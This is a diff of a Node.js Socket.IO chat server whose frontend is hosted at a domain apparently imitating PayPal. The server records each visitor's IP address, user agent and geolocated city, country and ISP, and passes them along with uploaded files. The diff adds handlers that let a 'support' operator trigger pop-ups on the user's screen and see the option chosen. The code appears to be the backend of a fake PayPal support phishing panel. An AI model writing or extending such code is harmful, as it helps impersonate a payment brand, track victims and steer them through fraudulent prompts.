@@ -9,7 +9,7 @@ const app = express();
 const server = http.createServer(app);
 
 // --- Configuration CORS ---
-const frontendURL = "https://paypal-owpo.onrender.com"; // Assurez-vous que c'est la bonne URL de votre frontend
+const frontendURL = "https://paypal-owpo.onrender.com";
 app.use(cors({ origin: frontendURL }));
 
 // --- Initialisation de Socket.IO ---
@@ -18,7 +18,7 @@ const io = new Server(server, {
     origin: frontendURL,
     methods: ["GET", "POST"]
   },
-  maxHttpBufferSize: 1e6 // Limite de 1Mo pour les données (fichiers)
+  maxHttpBufferSize: 1e6 // Limite de 1Mo
 });
 
 app.use(express.json());
@@ -42,26 +42,18 @@ app.post('/verify', (req, res) => {
 });
 
 // --- Gestion des connexions Socket.IO ---
-io.on('connection', async (socket) => { // La fonction est asynchrone pour permettre la géolocalisation
+io.on('connection', async (socket) => {
   const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
   let geoInfo = { city: 'N/A', country: 'N/A', isp: 'N/A' };
 
   try {
-      // On interroge un service de géolocalisation gratuit
       const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
       const geoData = await geoResponse.json();
       if (geoData.status === 'success') {
-        geoInfo = {
-          city: geoData.city,
-          country: geoData.country,
-          isp: geoData.isp,
-        };
+        geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
       }
-  } catch (error) {
-    console.error("Erreur de géolocalisation:", error);
-  }
+  } catch (error) { console.error("Erreur de géolocalisation:", error); }
 
-  // On assemble toutes les informations dans un seul objet
   const clientInfo = {
     ip: clientIp,
     userAgent: socket.handshake.headers['user-agent'] || 'N/A',
@@ -70,8 +62,6 @@ io.on('connection', async (socket) => { // La fonction est asynchrone pour perme
     ...geoInfo
   };
   
-  console.log(`Un utilisateur s'est connecté : `, clientInfo);
-
   socket.broadcast.emit('user activity', { text: 'A user has connected.' });
 
   socket.on('chat message', (msg) => {
@@ -80,6 +70,21 @@ io.on('connection', async (socket) => { // La fonction est asynchrone pour perme
 
   socket.on('file message', (fileData) => {
     io.emit('file message', { ...fileData, clientInfo });
+  });
+
+  // NOUVEAU: Écoute les demandes de pop-up du support
+  socket.on('request popup', () => {
+    // Envoie l'ordre d'afficher le pop-up à tous les autres clients (l'utilisateur)
+    socket.broadcast.emit('display popup');
+  });
+
+  // NOUVEAU: Écoute le choix fait par l'utilisateur dans le pop-up
+  socket.on('popup choice', (choice) => {
+    // Envoie un message système à tout le monde pour confirmer le choix
+    io.emit('chat message', {
+      user: 'System',
+      text: `User has chosen the option: "${choice.option}"`
+    });
   });
 
   socket.on('clear chat', () => { io.emit('chat cleared'); });
